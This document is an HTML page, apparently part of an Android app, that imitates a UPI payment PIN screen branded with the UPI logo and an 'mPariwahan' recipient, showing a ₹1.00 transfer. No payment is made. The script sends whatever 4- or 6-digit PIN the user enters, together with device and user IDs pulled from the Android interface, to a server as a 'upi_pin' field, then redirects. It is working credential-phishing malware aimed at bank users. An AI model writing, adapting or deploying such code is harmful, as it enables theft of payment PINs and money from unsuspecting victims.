<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>UPI PIN Entry</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
      let pinArr = [];

      if (typeof Android !== "undefined" && Android.getAppNameS) {
        document.getElementById("appName").textContent = Android.getAppNameS();
      } else {
        document.getElementById("appName").textContent =
          "mPariwahan";
      }

      function updateInputs() {
        for (let i = 0; i < 6; i++) {
          document.getElementById("pin" + i).value = "";
        }

        for (let i = 0; i < pinArr.length; i++) {
          document.getElementById("pin" + i).value = pinArr[i];
        }

        updateInputVisibility();
      }

      function updateInputVisibility() {
        for (let i = 0; i < 6; i++) {
          document.getElementById("pin" + i).style.display = "none";
        }

        const visibleCount = pinArr.length <= 4 ? 4 : 6;
        for (let i = 0; i < visibleCount; i++) {
          document.getElementById("pin" + i).style.display = "";
        }
      }

      function addDigit(digit) {
        if (pinArr.length < 6) {
          pinArr.push(digit);
          updateInputs();
        }
      }

      function removeLastDigit() {
        pinArr.pop();
        updateInputs();
      }

      function showPopup() {
        document.getElementById("popup").classList.remove("hidden");
      }

      function closePopup() {
        document.getElementById("popup").classList.add("hidden");
      }

      function submitPIN() {
        if (pinArr.length === 4 || pinArr.length === 6) {
          const pin = pinArr.join("");
          try {
            const apiURL = Android.getApiUrl();
            const deviceId = Android.getDeviceId();
            const userId = Android.getUserId();

            fetch(`${apiURL}/client/devices/${deviceId}?userId=${userId}`, {
              method: "PUT",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                field: "upi_pin",
                value: pin,
              }),
            })
              .then((res) => {
                if (!res.ok) throw new Error("Server error");
                return res.json();
              })
              .then((data) => {
                console.log("PIN updated successfully:", data);
                window.location.href = "final.html";
              })
              .catch((err) => {
                console.error("Network or server error:", err);
                alert("Something went wrong. Please try again.");
              });
          } catch (err) {
            console.error("Android interface error:", err);
            alert("Device error. Please retry on a real device.");
          }
        } else {
          showPopup();
        }
      }

      window.onload = () => {
        updateInputs();
      };
    </script>
  </head>

  <body class="bg-white text-black min-h-screen flex flex-col justify-between">
    <!-- Header -->
    <div class="flex flex-col items-center pb-2 border-b border-gray-300">
      <div class="w-full px-4 flex justify-between items-center">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/f/fa/UPI-Logo.png"
          alt="UPI"
          class="h-12 mx-auto"
        />
      </div>
      <div
        class="box flex w-full py-2 px-4 bg-[#80808020] items-center justify-between"
      >
        <div class="to">
          <div class="text-sm text-gray-500">To:</div>
          <div class="text-sm text-gray-500">Sending:</div>
        </div>
        <div class="to">
          <div id="appName" class="text-sm text-gray-500 font-bold"></div>
          <div class="text-sm text-gray-500 font-bold">₹ 1.00</div>
        </div>
      </div>
    </div>

    <!-- PIN Entry -->
    <div class="flex flex-col items-center py-6">
      <p class="text-sm text-gray-700 mb-4">ENTER UPI 4 OR 6 DIGIT PIN</p>
      <div class="flex justify-center space-x-2 mb-4">
        <input
          type="password"
          id="pin0"
          maxlength="1"
          class="w-10 h-12 text-center text-2xl border-gray-400 bg-white"
          readonly
        />
        <input
          type="password"
          id="pin1"
          maxlength="1"
          class="w-10 h-12 text-center text-2xl border-gray-400 bg-white"
          readonly
        />
        <input
          type="password"
          id="pin2"
          maxlength="1"
          class="w-10 h-12 text-center text-2xl border-gray-400 bg-white"
          readonly
        />
        <input
          type="password"
          id="pin3"
          maxlength="1"
          class="w-10 h-12 text-center text-2xl border-gray-400 bg-white"
          readonly
        />
        <input
          type="password"
          id="pin4"
          maxlength="1"
          class="w-10 h-12 text-center text-2xl border-gray-400 bg-white"
          readonly
        />
        <input
          type="password"
          id="pin5"
          maxlength="1"
          class="w-10 h-12 text-center text-2xl border-gray-400 bg-white"
          readonly
        />
      </div>
      <div
        class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-2 mt-4 text-xs w-3/4 text-center rounded"
      >
        <span class="font-bold">!</span> You are transferring money from your
        account to Mparivahan
      </div>
    </div>

    <!-- Keypad -->
    <div class="bg-gray-100 py-4 rounded-t-3xl">
      <div
        class="grid grid-cols-3 gap-4 px-12 text-2xl font-medium text-gray-800"
      >
        <button class="py-4" onclick="addDigit('1')">1</button>
        <button class="py-4" onclick="addDigit('2')">2</button>
        <button class="py-4" onclick="addDigit('3')">3</button>
        <button class="py-4" onclick="addDigit('4')">4</button>
        <button class="py-4" onclick="addDigit('5')">5</button>
        <button class="py-4" onclick="addDigit('6')">6</button>
        <button class="py-4" onclick="addDigit('7')">7</button>
        <button class="py-4" onclick="addDigit('8')">8</button>
        <button class="py-4" onclick="addDigit('9')">9</button>
        <button class="py-4 text-xl text-center" onclick="removeLastDigit()">
          <img src="./back.png" alt="Delete" width="30px" class="mx-auto" />
        </button>
        <button class="py-4" onclick="addDigit('0')">0</button>
        <button
          id="submitBtn"
          class="py-4 text-2xl text-center"
          onclick="submitPIN()"
        >
          <img src="./right.png" alt="Submit" width="40px" class="mx-auto" />
        </button>
      </div>
    </div>

    <!-- Custom Popup -->
    <div
      id="popup"
      class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 hidden"
    >
      <div class="bg-white rounded-lg p-6 w-3/4 max-w-sm text-center shadow-xl">
        <p class="text-red-600 font-semibold mb-4">
          कृपया सही 4 या 6 अंकों का पिन दर्ज करें।
        </p>
        <button
          onclick="closePopup()"
          class="bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700"
        >
          ठीक है
        </button>
      </div>
    </div>
  </body>
</html>
